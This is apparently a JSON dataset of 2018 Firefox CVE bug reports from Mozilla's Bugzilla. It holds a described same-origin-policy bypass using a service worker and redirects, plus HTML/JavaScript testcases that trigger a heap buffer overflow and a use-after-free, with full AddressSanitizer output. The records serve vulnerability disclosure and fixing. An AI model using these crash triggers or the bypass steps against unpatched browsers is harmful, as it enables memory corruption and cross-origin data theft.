{
  "year": 2018,
  "total": 120,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2018-12358": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1467852",
        "title": "same-origin bypass using service worker and redirects due to incorrect redirected synthesized taint handling",
        "description": "In bug 1222008 we added a flag that specifies that the tainting on a particular LoadInfo has been synthesized by a service worker. This allows the service worker to override the tainting that would have been otherwise set for the response. For example, if a page does `fetch(crossOriginURL)`, we start tainting the response immediately when we see the cross-origin URL. The intercepting service worker, though, can do `e.respondWith(fetch(sameOriginURL))` which overrides the tainting back to a same-origin \"basic\" response. The flag added in bug 1222008 makes sure our security code doesn't then come along and force the tainting back to something else. The problem, though, is we are currently copying the flag when a redirected channel's LoadInfo is created: https://searchfox.org/mozilla-central/rev/c621276fbdd9591f52009042d959b9e19b66d49f/netwerk/base/LoadInfo.cpp#399 I believe this means probably means its possible to bypass same-origin policy and read no-cors opaque responses by doing something like: 1. evil.com registers a service worker 2. evil.com makes some request that will be intercepted by the SW 3. The SW responds with a redirect status code and Location header pointing at a private resource on good.com. This sets the synthesized flag. 4. The redirect is initiated and re-enters the SW, but the SW does not call respondWith(). (This incorrectly preserves the synthesized flag from 4.) 5. The normal network response retrieves good.com's resource, but is returned as a basic response because the synthesized flag from 4 is still set. I'll see if I can write a test that demonstrates this."
      }
    ],
    "CVE-2018-12359": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1459162",
        "title": "heap-buffer-overflow in mozilla::dom::CanvasRenderingContext2D::PutImageData",
        "description": "The following testcase crashes the latest ASAN build of Firefox 61.0a1 (SourceStamp=8994f35fe5fc89f4e8f4e09579a6962f8a4a3e65). crash.html: <script> function start() { o24=document.createElement('marquee'); document.documentElement.addEventListener('DOMAttrModified',fun0); o44=document.createElement('canvas'); document.documentElement.appendChild(o44); document.documentElement.appendChild(o24); o169=o44.getContext('2d'); o210.putImageData(o243,32,29,33,256,16,-40960); } function fun0() { o210=o44.getContext('2d'); o243=o210.createImageData(128,-786428); o44.setAttribute('height','48'); o210.resetTransform(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==4657==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x63000007e604 at pc 0x7f744181a584 bp 0x7ffe9a7306a0 sp 0x7ffe9a730698 WRITE of size 16 at 0x63000007e604 thread T0 (file:// Content) #0 0x7f744181a583 in void mozilla::gfx::Premultiply_SSE2<true, false>(unsigned char const*, int, unsigned char*, int, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>) /builds/worker/workspace/build/src/gfx/2d/SwizzleSSE2.cpp:110:7 #1 0x7f744195eb0a in mozilla::gfx::PremultiplyData(unsigned char const*, int, mozilla::gfx::SurfaceFormat, unsigned char*, int, mozilla::gfx::SurfaceFormat, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&) /builds/worker/workspace/build/src/gfx/2d/Swizzle.cpp #2 0x7f7444eef273 in mozilla::dom::CanvasRenderingContext2D::PutImageData_explicit(int, int, unsigned int, unsigned int, mozilla::dom::TypedArray<unsigned char, &js::UnwrapUint8ClampedArray, &(JS_GetUint8ClampedArrayData(JSObject*, bool*, JS::AutoRequireNoGC const&)), &js::GetUint8ClampedArrayLengthAndData, &(JS_NewUint8ClampedArray(JSContext*, unsigned int))>*, bool, int, int, int, int) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:5796:3 #3 0x7f7444eeff18 in mozilla::dom::CanvasRenderingContext2D::PutImageData(mozilla::dom::ImageData&, double, double, double, double, double, double, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:5672:12 #4 0x7f7443c0956a in mozilla::dom::CanvasRenderingContext2DBinding::putImageData(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CanvasRenderingContext2DBinding.cpp:4124:13 #5 0x7f7444dc8ab1 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3260:13 #6 0x7f744b688d67 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #7 0x7f744b688d67 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #8 0x7f744b67342f in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #9 0x7f744b67342f in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #10 0x7f744b659ad3 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #11 0x7f744b688ae5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15 #12 0x7f744b689d62 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10 #13 0x7f744c1b995a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2989:12 #14 0x7f744454f3ae in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:264:37 #15 0x7f744553383a in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #16 0x7f744553383a in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #17 0x7f74454fa59d in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1121:52 #18 0x7f74454fbcab in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1288:20 #19 0x7f74454e6307 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:528:16 #20 0x7f74454ea133 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:934:9 #21 0x7f74477d3b38 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1066:7 #22 0x7f744a92cbc2 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7236:21 #23 0x7f744a928fe9 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7029:7 #24 0x7f744a9307ef in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #25 0x7f74415a0857 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1315:3 #26 0x7f744159f8da in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:858:14 #27 0x7f744159c4b5 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:747:9 #28 0x7f744159e47c in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:632:5 #29 0x7f744159f49c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp #30 0x7f743f90ee0a in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #31 0x7f744298163a in DoUnblockOnload /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8422:18 #32 0x7f744298163a in nsDocument::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:8344 #33 0x7f7442962384 in nsIDocument::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5328:3 #34 0x7f7442a748d4 in applyImpl<nsIDocument, void (nsIDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1165:12 #35 0x7f7442a748d4 in apply<nsIDocument, void (nsIDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1171 #36 0x7f7442a748d4 in mozilla::detail::RunnableMethodImpl<nsIDocument*, void (nsIDocument::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1216 #37 0x7f743f707161 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:337:32 #38 0x7f743f725f59 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1090:14 #39 0x7f743f741990 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #40 0x7f74406208ba in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #41 0x7f74405743b9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #42 0x7f74405743b9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #43 0x7f74405743b9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #44 0x7f744712c8ca in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #45 0x7f744b39fd0b in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #46 0x7f74405743b9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #47 0x7f74405743b9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #48 0x7f74405743b9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #49 0x7f744b39f6d0 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:719:34 #50 0x4f50dc in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #51 0x4f50dc in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #52 0x7f745f37482f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #53 0x42476c in _start (/fuzzer3/firefox/firefox+0x42476c) 0x63000007e604 is located 260 bytes to the right of 57600-byte region [0x630000070400,0x63000007e500) allocated by thread T0 (file:// Content) here: #0 0x4c569a in calloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:97:3 #1 0x7f744a1d837a in sk_calloc_canfail /builds/worker/workspace/build/src/gfx/skia/skia/include/private/SkMalloc.h:74:12 #2 0x7f744a1d837a in MakeUsing /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkMallocPixelRef.cpp:76 #3 0x7f744a1d837a in SkMallocPixelRef::MakeZeroed(SkImageInfo const&, unsigned long) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkMallocPixelRef.cpp:91 #4 0x7f7449db4262 in SkSurface::MakeRaster(SkImageInfo const&, unsigned long, SkSurfaceProps const*) /builds/worker/workspace/build/src/gfx/skia/skia/src/image/SkSurface_Raster.cpp:216:28 #5 0x7f74417a9b4f in mozilla::gfx::DrawTargetSkia::Init(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat) /builds/worker/workspace/build/src/gfx/2d/DrawTargetSkia.cpp:1918:14 #6 0x7f74417b6ceb in mozilla::gfx::Factory::CreateDrawTarget(mozilla::gfx::BackendType, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat) /builds/worker/workspace/build/src/gfx/2d/Factory.cpp:403:22 #7 0x7f7441b3fa7c in mozilla::layers::PersistentBufferProviderBasic::Create(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>, mozilla::gfx::SurfaceFormat, mozilla::gfx::BackendType) /builds/worker/workspace/build/src/gfx/layers/PersistentBufferProvider.cpp:83:55 #8 0x7f7441bc76d3 in mozilla::layers::LayerManager::CreatePersistentBufferProvider(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::SurfaceFormat) /builds/worker/workspace/build/src/gfx/layers/Layers.cpp:146:5 #9 0x7f7444eb952d in mozilla::dom::CanvasRenderingContext2D::TrySharedTarget(RefPtr<mozilla::gfx::DrawTarget>&, RefPtr<mozilla::layers::PersistentBufferProvider>&) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1877:32 #10 0x7f7444eb5748 in mozilla::dom::CanvasRenderingContext2D::EnsureTarget(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const*, mozilla::dom::CanvasRenderingContext2D::RenderingMode) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1686:8 #11 0x7f7444ebf3a1 in TransformWillUpdate /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:3660:3 #12 0x7f7444ebf3a1 in SetTransform /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:2254 #13 0x7f7444ebf3a1 in mozilla::dom::CanvasRenderingContext2D::ResetTransform(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:2285 #14 0x7f7443c20818 in mozilla::dom::CanvasRenderingContext2DBinding::resetTransform(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CanvasRenderingContext2DBinding.cpp:6438:9 #15 0x7f7444dc8ab1 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3260:13 #16 0x7f744b688d67 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #17 0x7f744b688d67 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #18 0x7f744b67342f in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #19 0x7f744b67342f in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #20 0x7f744b659ad3 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #21 0x7f744b688ae5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15 #22 0x7f744b689d62 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10 #23 0x7f744c1b995a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2989:12 #24 0x7f74445545f5 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:51:8 #25 0x7f74454fa54e in HandleEvent<mozilla::dom::EventTarget *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:66:12 #26 0x7f74454fa54e in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1118 #27 0x7f74454fbcab in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1288:20 #28 0x7f74454e6607 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:560:14 #29 0x7f74454ea133 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:934:9 #30 0x7f74454ec38b in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp #31 0x7f7442a2f4f8 in nsINode::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/nsINode.cpp:1079:5 #32 0x7f744550a6f3 in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&) /builds/worker/workspace/build/src/dom/events/EventTarget.cpp:204:13 #33 0x7f7445480b3c in mozilla::AsyncEventDispatcher::Run() /builds/worker/workspace/build/src/dom/events/AsyncEventDispatcher.cpp:68:12 #34 0x7f7442580d5f in nsContentUtils::RemoveScriptBlocker() /builds/worker/workspace/build/src/dom/base/nsContentUtils.cpp:5635:15 #35 0x7f744295e987 in nsDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5103:3 #36 0x7f74458dfc2c in nsHTMLDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2120:15 SUMMARY: AddressSanitizer: heap-buffer-overflow /builds/worker/workspace/build/src/gfx/2d/SwizzleSSE2.cpp:110:7 in void mozilla::gfx::Premultiply_SSE2<true, false>(unsigned char const*, int, unsigned char*, int, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits>) Shadow bytes around the buggy address: 0x0c6080007c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c6080007c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c6080007c90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c6080007ca0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c6080007cb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c6080007cc0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c6080007cd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c6080007ce0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c6080007cf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c6080007d00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c6080007d10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==4657==ABORTING"
      }
    ],
    "CVE-2018-12360": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1459693",
        "title": "heap-use-after-free in nsFocusManager::CheckIfFocusable",
        "description": "The following testcase crashes a fuzzing build (--enable-fuzzing) of Firefox 61.0a1 (SourceStamp=b1628ac71fcc15797baec6083650bfcde650f190). It requires the fuzzing.enabled pref to be set to true. <script> function start() { document.removeChild(document.documentElement); o0=document.createElement('HTML'); o1144=document.createElement('LI'); o1340=document.createElement('A'); o1144.appendChild(o1340); o0.appendChild(o1144); document.appendChild(o0); window.top.setTimeout(fun0, 400); } function fun0() { o1662=document.createElement('input'); o1662.type='number'; o1340.appendChild(o1662); o1711=document.createElement('textarea'); o0.appendChild(o1711); o1711.select(); o1718=document.createElement('marquee'); o0.addEventListener('DOMAttrModified',fun1); o0.appendChild(o1718); o1662.focus(); } function fun1() { o0.remove(); FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==10502==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500021439c at pc 0x7f6e33e45849 bp 0x7ffe54addfb0 sp 0x7ffe54addfa8 READ of size 4 at 0x61500021439c thread T0 (file:// Content) #0 0x7f6e33e45848 in GetBoolFlag /builds/worker/workspace/build/src/dom/base/nsINode.h:1644:12 #1 0x7f6e33e45848 in IsInUncomposedDoc /builds/worker/workspace/build/src/dom/base/nsINode.h:654 #2 0x7f6e33e45848 in GetPrimaryFrame /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIContent.h:699 #3 0x7f6e33e45848 in GetPrimaryFrame /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:1438 #4 0x7f6e33e45848 in nsFocusManager::CheckIfFocusable(mozilla::dom::Element*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1624 #5 0x7f6e33e40fed in nsFocusManager::SetFocusInner(mozilla::dom::Element*, int, bool, bool) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1226:36 #6 0x7f6e33e445ca in nsFocusManager::SetFocus(mozilla::dom::Element*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:518:3 #7 0x7f6e33bd0752 in mozilla::dom::Element::Focus(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/Element.cpp:348:20 #8 0x7f6e36bdf023 in mozilla::dom::HTMLInputElement::Focus(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3198:27 #9 0x7f6e36bdeb7f in mozilla::dom::HTMLInputElement::Focus(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3182:22 #10 0x7f6e35d7fad2 in mozilla::dom::HTMLElementBinding::focus(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:540:9 #11 0x7f6e36240b21 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3260:13 #12 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15 #13 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #14 0x7f6e3caf06bf in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #15 0x7f6e3caf06bf in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086 #16 0x7f6e3cad6d63 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #17 0x7f6e3cb05d75 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15 #18 0x7f6e3cb06ff2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10 #19 0x7f6e3d637c2a in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2989:12 #20 0x7f6e35b86e9d in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:40:8 #21 0x7f6e33ac3bdb in Call<nsCOMPtr<nsISupports> > /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:73:12 #22 0x7f6e33ac3bdb in nsGlobalWindowInner::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:6658 #23 0x7f6e33ce1456 in mozilla::dom::TimeoutManager::RunTimeout(mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/worker/workspace/build/src/dom/base/TimeoutManager.cpp:877:42 #24 0x7f6e33ce0734 in mozilla::dom::TimeoutExecutor::MaybeExecute() /builds/worker/workspace/build/src/dom/base/TimeoutExecutor.cpp:172:11 #25 0x7f6e33ce2936 in Notify /builds/worker/workspace/build/src/dom/base/TimeoutExecutor.cpp:240:5 #26 0x7f6e33ce2936 in non-virtual thunk to mozilla::dom::TimeoutExecutor::Notify(nsITimer*) /builds/worker/workspace/build/src/dom/base/TimeoutExecutor.cpp #27 0x7f6e30babd9b in nsTimerImpl::Fire(int) /builds/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:704:40 #28 0x7f6e30b7b429 in nsTimerEvent::Run() /builds/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:290:11 #29 0x7f6e30b97c87 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /builds/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:188:22 #30 0x7f6e30b978bf in mozilla::ThrottledEventQueue::Inner::Executor::Run() /builds/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:72:15 #31 0x7f6e30b6c641 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:337:32 #32 0x7f6e30b8b439 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1090:14 #33 0x7f6e30ba6e70 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #34 0x7f6e31a859e6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:125:5 #35 0x7f6e319d94f9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #36 0x7f6e319d94f9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #37 0x7f6e319d94f9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #38 0x7f6e385a8e4a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #39 0x7f6e3c81cf9b in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #40 0x7f6e319d94f9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #41 0x7f6e319d94f9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #42 0x7f6e319d94f9 in MessageLoop::Run() 